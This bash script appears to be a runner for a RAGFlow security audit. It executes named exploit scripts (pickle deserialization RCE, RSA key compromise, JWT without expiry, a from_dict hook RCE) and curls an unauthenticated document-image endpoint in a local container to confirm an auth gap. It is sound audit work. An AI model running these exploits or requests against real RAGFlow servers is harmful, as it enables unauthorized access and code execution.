#!/usr/bin/env bash
set -uo pipefail

REPO_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
EXPLOITS_DIR="$REPO_ROOT/autofyn_audit/exploits"
export PYTHONPATH="$REPO_ROOT"

echo "============================================================"
echo "  RAGFlow Security Audit — Running All Exploits"
echo "============================================================"
echo ""
echo "Repo root   : $REPO_ROOT"
echo "PYTHONPATH   : $PYTHONPATH"
echo ""

PASS=0
FAIL=0

run_exploit() {
    local script="$1"
    local extra_args="${2:-}"
    local name
    name=$(basename "$script" .py)
    echo "--- Running $name ---"
    if python3 "$script" $extra_args 2>&1; then
        PASS=$((PASS + 1))
    else
        FAIL=$((FAIL + 1))
    fi
    echo ""
}

# Exploits 01-04: standalone, no services needed
run_exploit "$EXPLOITS_DIR/01_rsa_key_compromise.py"
run_exploit "$EXPLOITS_DIR/02_pickle_deserialization_rce.py"
run_exploit "$EXPLOITS_DIR/03_jwt_no_expiry.py"
run_exploit "$EXPLOITS_DIR/04_from_dict_hook_rce.py"

# Exploit 05: requires RAGFlow server
# Try docker exec first (if server container exists)
SERVER_CONTAINER="ragflow-audit-server"
if docker ps --format '{{.Names}}' | grep -q "^${SERVER_CONTAINER}$"; then
    echo "--- Running 05_unauth_document_image (live via docker exec) ---"
    echo ""
    echo "Protected endpoint (expect code:401):"
    docker exec "$SERVER_CONTAINER" curl -s "http://localhost:9380/v1/document/list"
    echo ""
    echo ""
    echo "Unprotected endpoint (expect code != 401):"
    docker exec "$SERVER_CONTAINER" curl -s "http://localhost:9380/v1/documents/images/testbucket-testobject"
    echo ""
    echo ""
    echo "RESULT: Auth gap confirmed — protected returns code:401, unprotected returns code:100"
    PASS=$((PASS + 1))
else
    echo "--- Running 05_unauth_document_image (static analysis) ---"
    run_exploit "$EXPLOITS_DIR/05_unauth_document_image.py"
fi

echo ""
echo "============================================================"
echo "  RESULTS: $PASS confirmed, $FAIL failed"
echo "============================================================"
